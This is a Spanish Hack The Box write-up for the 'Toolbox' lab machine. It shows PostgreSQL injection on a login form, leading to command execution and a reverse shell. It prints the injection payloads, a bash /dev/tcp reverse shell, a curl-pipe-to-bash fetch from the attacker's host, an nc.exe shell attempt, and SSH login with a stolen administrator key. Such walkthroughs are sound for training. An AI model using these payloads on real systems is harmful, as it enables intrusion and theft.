---
layout: single
title: Toolbox - Hack The Box
excerpt: "En esta máquina fácil Windows nos hemos aprovechado de la vulnerabilidad PostgreSQL Injection, con la que hemos sido capaz de realizar un RCE y conectarnos a un contenedor linux de la máquina víctima. Una vez dentro, nos hemos aprovechado de docker-toolbox (que veíamos en un recurso compartido ftp -boot2docker-) para conectarnos con las credenciales por defecto mediante ssh a la máquina victima real como el usuario docker."
date: 2023-09-15
classes: wide
header:
  teaser: /assets/images/htb-writeup-toolbox/toolbox_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:
  - Windows
  - PostgreSQL Injection
  - Docker
---

![](/assets/images/htb-writeup-toolbox/toolbox_logo.png)

# Enumeración
Puertos abiertos:
![](/assets/images/htb-writeup-toolbox/nmap_toolbox.png)

Podemos observar que por el puerto **21 (ftp)** se nos está compartiendo un binario de **docker-toolbox.exe**, ya que podemos acceder como el usuario **anonymous**. A su vez, vemos un subdominio llamado **admin.megalogistic.com** el cuál tenemos que añadir al **/etc/hosts**.

![](/assets/images/htb-writeup-toolbox/etc_hosts_toolbox.png)

Antes de entrar en la web, podemos echar un vistazo al servicio **smb** para ver si nos están compartiendo algún recurso pero no encontraremos gran cosa.

# Explotación servicio web

Una vez accedido a la web veremos el siguiente panel login:

![](/assets/images/htb-writeup-toolbox/login_panel_toolbox.png)

Probando credenciales por defecto como **admin:admin** no conseguiremos acceder pero si ponemos una comilla saltará el siguiente error:

![](/assets/images/htb-writeup-toolbox/sql_injection_toolbox.png)

## ¿Qué es PostgreSQL?

Si miramos la definición que nos pone en la web oficial: *PostgreSQL es un potente sistema de base de datos relacional por objetos de código abierto con más de 35 años de desarrollo activo que le ha valido una sólida reputación por su fiabilidad, robustez y rendimiento.*

Si buscamos información sobre posibles inyecciones SQL encontraremos el siguiente recurso: [Postgre RCE](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql)<br>

Cuyo PoC seria este:
```
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;
```
Sabiendo esto es hora de entablarnos una **reverse shell**. Primero, pobramos suponiendo que el contendor es una máquina Windows. Tramitariamos esta petición y nos pondriamos en escucha con **impacket-smbserver** compartiendo el **netcat** por ejemplo:
```
username=';COPY cmd_exec FROM PROGRAM '\\10.10.14.18\smbFolder\nc.exe -e cmd 10.10.14.18 443';-- -&password='
```
Pero como podemos ver no nos llega ninguna conexión.

![](/assets/images/htb-writeup-toolbox/conect_with_impacket.png)

Por lo tanto, podemos suponer que se trata de una máquina Linux. Para entablarnos la **reverse shell** haremos lo siguiente:
1. Nos creamos un archivo con nombre arbitario, en este caso "test", con el siguiente contenido:<br>
```
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.18/443 0>&1
```
2. Nos montamos un servidor con python3 compartiendo ese recurso
3. Mandamos la siguiente petición mientras estamos en escucha con netcat por el puerto 443 `nc -lvnp 443`:
```
username=';COPY cmd_exec FROM PROGRAM 'curl 10.10.14.18/test | bash';-- -&password='
```
4. Hacemos un tratamiento de la tty
```
script /dev/null -c bash
Control + z
stty raw -echo; fg
reset xterm
```
5. Accedemos al contenedor que ofrece el servicio web :D.

# Escalada de privilegios
## ¿Qué es Docker-Toolbox?

Según la definición: *Es una aplicación que se instala con un solo clic en su entorno Mac, Linux o Windows y que permite crear, compartir y ejecutar aplicaciones y microservicios en contenedores.*

Indagando un poquito más veremos que posee unas **credenciales por defecto** y como está el puerto **22 (ssh)** de Windows abierto tal vez nos sirvan para conectarnos a la máquina principal. Las podremos ver en este recurso:

- [Docker-Toolbox Default Credentials](https://stackoverflow.com/questions/32646952/docker-machine-boot2docker-root-password)

Hemos concedido acceder a la máquina principal, si nos dirigimos a la raíz del sistema veremos que hay una carpeta llamada **C** con lo que parece ser todos los archivos de la máquina Windows víctima, incluso podemos acceder a la carpeta de **Administrador**. En esta carpeta, encontraremos una clave **id_rsa** con la que podremos acceder a la máquina **Toolbox (10.10.10.236)** mediante los siguientes comandos:
```
# Copiamos la clave id_rsa en nuestra maquina y le asignamos el permiso 600
chmod 600 id_rsa
ssh -i id_rsa administrator@10.10.10.236
```
